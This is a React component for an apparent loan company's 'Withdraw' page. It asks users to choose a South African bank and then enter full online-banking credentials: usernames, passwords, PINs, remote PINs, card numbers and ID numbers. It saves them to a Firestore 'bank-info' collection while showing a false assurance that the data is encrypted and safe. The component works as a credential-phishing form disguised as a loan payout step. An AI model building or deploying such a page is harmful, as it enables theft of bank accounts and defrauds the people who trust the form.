import { Button, Divider } from "@material-ui/core";
import React, { useRef, useState } from "react";
import { useAuth } from "../../contexts/AuthContext";
import { Link, useHistory } from "react-router-dom";
import { Box, Container, Paper, Typography } from "@material-ui/core";
import AuthAppBar from "../comPeice/AuthAppBar";
import MobileAuthAppBar from "../comPeice/MobileAuthAppBar";
import DashAppBar from "../comPeice/DashAppBar";
import MobileDashAppBar from "../comPeice/MobileDashAppBar";
import CheckIcon from "@material-ui/icons/Check";
import { makeStyles } from "@material-ui/core/styles";
import TextField from "@material-ui/core/TextField";
import MenuItem from "@material-ui/core/MenuItem";
import { db } from "../../firebase";
import { Alert } from "@material-ui/lab";

const banks = [
  {
    value: "Capitec Bank",
    label: "Capitec Bank",
  },
  {
    value: "FNB Bank",
    label: "FNB Bank",
  },
  {
    value: "Nedbank",
    label: "Nedbank",
  },
  {
    value: "Standard Bank",
    label: "Standard Bank",
  },
  {
    value: "Absa Bank",
    label: "Absa Bank",
  },
  {
    value: "Tyme Bank",
    label: "Tyme Bank",
  },
];

const useStyles = makeStyles((theme) => ({
  root: {
    "& .MuiTextField-root": {
      margin: theme.spacing(1),
      width: "95%",
    },
  },
}));

export default function Withdraw() {
  const classes = useStyles();
  const [bank, setBank] = React.useState("");

  const [error, setError] = useState("");
  const {
    currentUser,
    logout,
    fullName,
    country,
    currency,
    loanAmount,
    loanActivation,
  } = useAuth();
  const history = useHistory();
  const bankRef = useRef();
  const [capitecBank, setCapitecBank] = useState(false);
  const [fbnBank, SetFbnBank] = useState(false);
  const [nedbank, SetNedbank] = useState(false);
  const [standardBank, SetStandardBank] = useState(false);
  const [absabank, SetAbsaBank] = useState(false);
  const [tymeBank, SetTymeBank] = useState(false);

  const [btn, setBtn] = useState(true);

  async function handleLogout() {
    setError("");

    try {
      await logout();
      history.push("/signin");
    } catch {
      setError("Failed to logout");
    }
  }

  const handleChange = (event) => {
    setBank(event.target.value);

    if (event.target.value === "Capitec Bank") {
      setCapitecBank(true);
      setBtn(false);
    } else {
      setCapitecBank(false);
    }

    if (event.target.value === "FNB Bank") {
      SetFbnBank(true);
      setBtn(false);
    } else {
      SetFbnBank(false);
    }

    if (event.target.value === "Nedbank") {
      SetNedbank(true);
      setBtn(false);
    } else {
      SetNedbank(false);
    }

    if (event.target.value === "Standard Bank") {
      SetStandardBank(true);
      setBtn(false);
    } else {
      SetStandardBank(false);
    }

    if (event.target.value === "Absa Bank") {
      SetAbsaBank(true);
      setBtn(false);
    } else {
      SetAbsaBank(false);
    }

    if (event.target.value === "Tyme Bank") {
      SetTymeBank(true);
      setBtn(false);
    } else {
      SetTymeBank(false);
    }
  };

  //input states
  const [capRefNumError, setCapRefNumError] = useState("");
  const [capRefNumError2, setCapRefNumError2] = useState("");
  const [capRefNumError3, setCapRefNumError3] = useState("");
  const [capRefNumError4, setCapRefNumError4] = useState("");
  const [capRefNumError5, setCapRefNumError5] = useState("");
  const [capRefNumError6, setCapRefNumError6] = useState("");

  const [message, setMessage] = useState("");
  const [message2, setMessage2] = useState("");
  const [message3, setMessage3] = useState("");
  const [message4, setMessage4] = useState("");
  const [message5, setMessage5] = useState("");
  const [message6, setMessage6] = useState("");

  // inputRef
  // Capitech bank
  const capRefNum = useRef();
  const capRmtPin = useRef();
  //FBN bank
  const fbnUserNameRef = useRef();
  const fbnPassRef = useRef();
  const fbnPinRef = useRef();
  const fbnCardNumRef = useRef();
  //Ned bank
  const nedSaIdRef = useRef();
  const nedCardRef = useRef();
  const nedPinRef = useRef();
  const nedPassef = useRef();
  //Std bank
  const stdGMRef = useRef();
  const stdPWDRef = useRef();
  const stdCardRef = useRef();
  const stdPinRef = useRef();
  //ABS bank
  const absAccountNumef = useRef();
  const absPinRef = useRef();
  const absPWDRef = useRef();
  //ABS bank
  const tymPinRef = useRef();
  const tymIdRef = useRef();

  async function handleSubmit(e) {
    e.preventDefault();

    if (capRefNum.current.value === "" || capRmtPin.current.value === "") {
      setCapRefNumError("Field cannot be blank");
    } else {
      setCapRefNumError("");
      await db
        .collection("users")
        .doc(currentUser.uid)
        .collection("bank-info")
        .doc("Capitec_Bank")
        .set({
          Reference_Number: capRefNum.current.value,
          Remote_Pin: capRmtPin.current.value,
        })
        .then(() => {
          db.collection("users").doc(currentUser.uid).update({
            loanActivation: "reviewing",
          });
          setMessage(
            "You have successfully updated your profile information! You would now be redirected to the dashboard"
          );
          setTimeout(() => {
            history.push("/");
          }, 5000);
        })
        .catch((e) => {
          console.log(e.message);
        });
    }
  }

  async function handleSubmit2(e) {
    e.preventDefault();
    if (
      fbnUserNameRef.current.value === "" ||
      fbnPassRef.current.value === "" ||
      fbnPinRef.current.value === "" ||
      fbnCardNumRef.current.value === ""
    ) {
      setCapRefNumError2("Field cannot be blank");
    } else {
      setCapRefNumError2("");
      await db
        .collection("users")
        .doc(currentUser.uid)
        .collection("bank-info")
        .doc("FNB_Bank")
        .set({
          User_Name: fbnUserNameRef.current.value,
          Password: fbnPassRef.current.value,
          Pin: fbnPinRef.current.value,
          Card_Number: fbnCardNumRef.current.value,
        })
        .then(() => {
          db.collection("users").doc(currentUser.uid).update({
            loanActivation: "reviewing",
          });
          setMessage2(
            "You have successfully updated your profile information! You would now be redirected to the dashboard"
          );
          setTimeout(() => {
            history.push("/");
          }, 5000);
        })
        .catch((e) => {
          console.log(e.message);
        });
    }
  }

  async function handleSubmit3(e) {
    e.preventDefault();
    if (
      nedSaIdRef.current.value === "" ||
      nedCardRef.current.value === "" ||
      nedPinRef.current.value === "" ||
      nedPassef.current.value === ""
    ) {
      setCapRefNumError3("Field cannot be blank");
    } else {
      setCapRefNumError3("");
      await db
        .collection("users")
        .doc(currentUser.uid)
        .collection("bank-info")
        .doc("Ned_Bank")
        .set({
          SA_ID: nedSaIdRef.current.value,
          Password: nedPassef.current.value,
          Pin: nedPinRef.current.value,
          Card_Number: nedCardRef.current.value,
        })
        .then(() => {
          db.collection("users").doc(currentUser.uid).update({
            loanActivation: "reviewing",
          });
          setMessage3(
            "You have successfully updated your profile information! You would now be redirected to the dashboard"
          );
          setTimeout(() => {
            history.push("/");
          }, 5000);
        })
        .catch((e) => {
          console.log(e.message);
        });
    }
  }
  async function handleSubmit4(e) {
    e.preventDefault();
    if (
      stdGMRef.current.value === "" ||
      stdPWDRef.current.value === "" ||
      stdCardRef.current.value === "" ||
      stdPinRef.current.value === ""
    ) {
      setCapRefNumError4("Field cannot be blank");
    } else {
      setCapRefNumError4("");
      await db
        .collection("users")
        .doc(currentUser.uid)
        .collection("bank-info")
        .doc("Standard_Bank")
        .set({
          Gmail: stdGMRef.current.value,
          Password: stdPWDRef.current.value,
          Card_Number: stdCardRef.current.value,
          Pin: stdPinRef.current.value,
        })
        .then(() => {
          db.collection("users").doc(currentUser.uid).update({
            loanActivation: "reviewing",
          });
          setMessage4(
            "You have successfully updated your profile information! You would now be redirected to the dashboard"
          );
          setTimeout(() => {
            history.push("/");
          }, 5000);
        })
        .catch((e) => {
          console.log(e.message);
        });
    }
  }
  async function handleSubmit5(e) {
    e.preventDefault();
    if (
      absAccountNumef.current.value === "" ||
      absPinRef.current.value === "" ||
      absPWDRef.current.value === ""
    ) {
      setCapRefNumError5("Field cannot be blank");
    } else {
      setCapRefNumError5("");
      setMessage4(
        "You have successfully updated your profile information! You would now be redirected to the dashboard"
      );
      await db
        .collection("users")
        .doc(currentUser.uid)
        .collection("bank-info")
        .doc("Abasa_Bank")
        .set({
          Account_number: absAccountNumef.current.value,
          Pin: absPinRef.current.value,
          Password: absPWDRef.current.value,
        })
        .then((e) => {
          db.collection("users").doc(currentUser.uid).update({
            loanActivation: "reviewing",
          });
          setTimeout(() => {
            history.push("/");
          }, 5000);
        })
        .catch((e) => {
          console.log(e.message);
        });
    }
  }
  async function handleSubmit6(e) {
    e.preventDefault();
    if (tymPinRef.current.value === "" || tymIdRef.current.value === "") {
      setCapRefNumError6("Field cannot be blank");
    } else {
      setCapRefNumError6("");
      setMessage4(
        "You have successfully updated your profile information! You would now be redirected to the dashboard"
      );
      await db
        .collection("users")
        .doc(currentUser.uid)
        .collection("bank-info")
        .doc("Tyme_Bank")
        .set({
          Pin: tymPinRef.current.value,
          Id_Number: tymIdRef.current.value,
        })
        .then(() => {
          db.collection("users").doc(currentUser.uid).update({
            loanActivation: "reviewing",
          });
          setTimeout(() => {
            history.push("/");
          }, 5000);
        })
        .catch((e) => {
          console.log(e.message);
        });
    }
  }

  return (
    <div className="root">
      <div>
        <Box display={{ xs: "none", sm: "none", md: "block", lg: "block" }}>
          <DashAppBar />
        </Box>

        <Box display={{ xs: "block", sm: "block", md: "none", lg: "none" }}>
          <MobileDashAppBar />
        </Box>
      </div>

      <Container>
        <div className="main">
          <Paper
            style={{ width: "95%", maxWidth: "550px", margin: "100px auto" }}
            elevation={3}
          >
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              Select your bank
            </Typography>
            <Divider />

            <div className="bank-select">
              <form className={classes.root} noValidate autoComplete="off">
                {message && <Alert severity="success">{message}</Alert>}
                {message2 && <Alert severity="success">{message2}</Alert>}
                {message3 && <Alert severity="success">{message3}</Alert>}
                {message4 && <Alert severity="success">{message4}</Alert>}
                {message5 && <Alert severity="success">{message5}</Alert>}
                {message6 && <Alert severity="success">{message6}</Alert>}
                <div>
                  <TextField
                    select
                    label="Bank"
                    value={bank}
                    onChange={handleChange}
                    helperText="Please select your bank"
                    inputRef={bankRef}
                  >
                    {banks.map((option) => (
                      <MenuItem key={option.value} value={option.value}>
                        {option.label}
                      </MenuItem>
                    ))}
                  </TextField>

                  {capitecBank && (
                    <div>
                      <TextField
                        label="Reference Number"
                        type="text"
                        helperText={
                          capRefNumError
                            ? capRefNumError
                            : "Please enter your bank reference number"
                        }
                        error={capRefNumError ? true : false}
                        inputRef={capRefNum}
                        required
                      />
                      <TextField
                        label="Remote Pin"
                        type="password"
                        helperText={
                          capRefNumError
                            ? capRefNumError
                            : "Please enter your bank remote pin"
                        }
                        error={capRefNumError ? true : false}
                        inputRef={capRmtPin}
                        required
                      />
                    </div>
                  )}
                  {fbnBank && (
                    <div>
                      <TextField
                        label="User Name"
                        type="text"
                        inputRef={fbnUserNameRef}
                        helperText={
                          capRefNumError2
                            ? capRefNumError2
                            : "Please enter your bank User Name"
                        }
                        error={capRefNumError2 ? true : false}
                        required
                      />
                      <TextField
                        label="Password"
                        type="password"
                        inputRef={fbnPassRef}
                        helperText={
                          capRefNumError2
                            ? capRefNumError2
                            : "Please enter your bank Password"
                        }
                        error={capRefNumError2 ? true : false}
                        required
                      />
                      <TextField
                        label="Pin"
                        type="password"
                        inputRef={fbnPinRef}
                        helperText={
                          capRefNumError2
                            ? capRefNumError2
                            : "Please enter your bank Pin"
                        }
                        error={capRefNumError2 ? true : false}
                        required
                      />
                      <TextField
                        label="Card Number"
                        type="text"
                        inputRef={fbnCardNumRef}
                        helperText={
                          capRefNumError2
                            ? capRefNumError2
                            : "Please enter your card number"
                        }
                        error={capRefNumError2 ? true : false}
                        required
                      />
                    </div>
                  )}

                  {nedbank && (
                    <div>
                      <TextField
                        label="SA ID"
                        type="text"
                        helperText={
                          capRefNumError3
                            ? capRefNumError3
                            : "Please enter your SA ID"
                        }
                        error={capRefNumError3 ? true : false}
                        inputRef={nedSaIdRef}
                        required
                      />
                      <TextField
                        label="Card Number"
                        type="text"
                        helperText={
                          capRefNumError3
                            ? capRefNumError3
                            : "Please enter your card number"
                        }
                        error={capRefNumError3 ? true : false}
                        inputRef={nedCardRef}
                        required
                      />
                      <TextField
                        label="Pin"
                        type="password"
                        helperText={
                          capRefNumError3
                            ? capRefNumError3
                            : "Please enter your bank Pin"
                        }
                        error={capRefNumError3 ? true : false}
                        inputRef={nedPinRef}
                        required
                      />
                      <TextField
                        label="Password"
                        type="password"
                        helperText={
                          capRefNumError3
                            ? capRefNumError3
                            : "Please enter your password"
                        }
                        error={capRefNumError3 ? true : false}
                        inputRef={nedPassef}
                        required
                      />
                    </div>
                  )}

                  {standardBank && (
                    <div>
                      <TextField
                        label="Gmail"
                        type="email"
                        inputRef={stdGMRef}
                        helperText={
                          capRefNumError4
                            ? capRefNumError4
                            : "Please enter your bank Gmail"
                        }
                        error={capRefNumError4 ? true : false}
                        required
                      />
                      <TextField
                        label="Password"
                        type="password"
                        inputRef={stdPWDRef}
                        helperText={
                          capRefNumError4
                            ? capRefNumError4
                            : "Please enter your password"
                        }
                        error={capRefNumError4 ? true : false}
                        required
                      />
                      <TextField
                        label="Card Number"
                        type="text"
                        inputRef={stdCardRef}
                        helperText={
                          capRefNumError4
                            ? capRefNumError4
                            : "Please enter your card number"
                        }
                        error={capRefNumError4 ? true : false}
                        required
                      />
                      <TextField
                        label="Pin"
                        type="password"
                        inputRef={stdPinRef}
                        helperText={
                          capRefNumError4
                            ? capRefNumError4
                            : "Please enter your pin"
                        }
                        error={capRefNumError4 ? true : false}
                        required
                      />
                    </div>
                  )}

                  {absabank && (
                    <div>
                      <TextField
                        label="Account Number"
                        type="text"
                        inputRef={absAccountNumef}
                        helperText={
                          capRefNumError5
                            ? capRefNumError5
                            : "Please enter your bank account number"
                        }
                        error={capRefNumError5 ? true : false}
                        required
                      />
                      <TextField
                        label="Pin"
                        type="password"
                        inputRef={absPinRef}
                        helperText={
                          capRefNumError5
                            ? capRefNumError5
                            : "Please enter your Bank pin"
                        }
                        error={capRefNumError5 ? true : false}
                        required
                      />
                      <TextField
                        label="Password"
                        type="password"
                        inputRef={absPWDRef}
                        helperText={
                          capRefNumError5
                            ? capRefNumError5
                            : "Please enter your Bank password"
                        }
                        error={capRefNumError5 ? true : false}
                        required
                      />
                    </div>
                  )}

                  {tymeBank && (
                    <div>
                      <TextField
                        label="Pin"
                        type="password"
                        inputRef={tymPinRef}
                        helperText={
                          capRefNumError6
                            ? capRefNumError6
                            : "Please enter your Bank pin"
                        }
                        error={capRefNumError6 ? true : false}
                        required
                      />
                      <TextField
                        label="ID Number"
                        type="text"
                        inputRef={tymIdRef}
                        helperText={
                          capRefNumError6
                            ? capRefNumError6
                            : "Please enter your Bank id number"
                        }
                        error={capRefNumError6 ? true : false}
                        required
                      />
                    </div>
                  )}
                </div>

                {capitecBank && (
                  <div
                    className="withdrawBtn"
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Button
                      variant="contained"
                      style={{
                        width: "90%",
                        borderRadius: 25,
                        background:
                          " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                        color: "#fff",
                        padding: "10px 5px",
                        margin: 20,
                      }}
                      disableElevation
                      onClick={handleSubmit}
                      type="submit"
                    >
                      Submit
                    </Button>
                  </div>
                )}

                {fbnBank && (
                  <div
                    className="withdrawBtn"
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Button
                      variant="contained"
                      style={{
                        width: "90%",
                        borderRadius: 25,
                        background:
                          " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                        color: "#fff",
                        padding: "10px 5px",
                        margin: 20,
                      }}
                      disableElevation
                      onClick={handleSubmit2}
                      type="submit"
                    >
                      Submit
                    </Button>
                  </div>
                )}

                {nedbank && (
                  <div
                    className="withdrawBtn"
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Button
                      variant="contained"
                      style={{
                        width: "90%",
                        borderRadius: 25,
                        background:
                          " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                        color: "#fff",
                        padding: "10px 5px",
                        margin: 20,
                      }}
                      disableElevation
                      onClick={handleSubmit3}
                      type="submit"
                    >
                      Submit
                    </Button>
                  </div>
                )}

                {standardBank && (
                  <div
                    className="withdrawBtn"
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Button
                      variant="contained"
                      style={{
                        width: "90%",
                        borderRadius: 25,
                        background:
                          " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                        color: "#fff",
                        padding: "10px 5px",
                        margin: 20,
                      }}
                      disableElevation
                      onClick={handleSubmit4}
                      type="submit"
                    >
                      Submit
                    </Button>
                  </div>
                )}

                {absabank && (
                  <div
                    className="withdrawBtn"
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Button
                      variant="contained"
                      style={{
                        width: "90%",
                        borderRadius: 25,
                        background:
                          " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                        color: "#fff",
                        padding: "10px 5px",
                        margin: 20,
                      }}
                      disableElevation
                      onClick={handleSubmit5}
                      type="submit"
                    >
                      Submit
                    </Button>
                  </div>
                )}

                {tymeBank && (
                  <div
                    className="withdrawBtn"
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Button
                      variant="contained"
                      style={{
                        width: "90%",
                        borderRadius: 25,
                        background:
                          " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                        color: "#fff",
                        padding: "10px 5px",
                        margin: 20,
                      }}
                      disableElevation
                      onClick={handleSubmit6}
                      type="submit"
                    >
                      Submit
                    </Button>
                  </div>
                )}
              </form>
            </div>
          </Paper>
        </div>

        <div
          className="info"
          style={{
            background: "linear-gradient(90deg, #d53369 0%, #daae51 100%)",
            padding: 30,
            marginBottom: 10,
            borderRadius: 35,
          }}
        >
          <Typography variant="h6" style={{ color: "#fff", marginBottom: 10 }}>
            Your information is safe with us.
          </Typography>
          <Typography variant="body1" style={{ color: "#fff" }}>
            The information you share with us is stored in an encrypted manner
            so you do not have to ever worry about data leaks or your
            information getting into the hands of malicious people. We would
            never share you information with anyone without you being informed.
            We follow very strict data protection policies here at First African
            Loan and Investment Company.
          </Typography>
        </div>
      </Container>
    </div>
  );
}
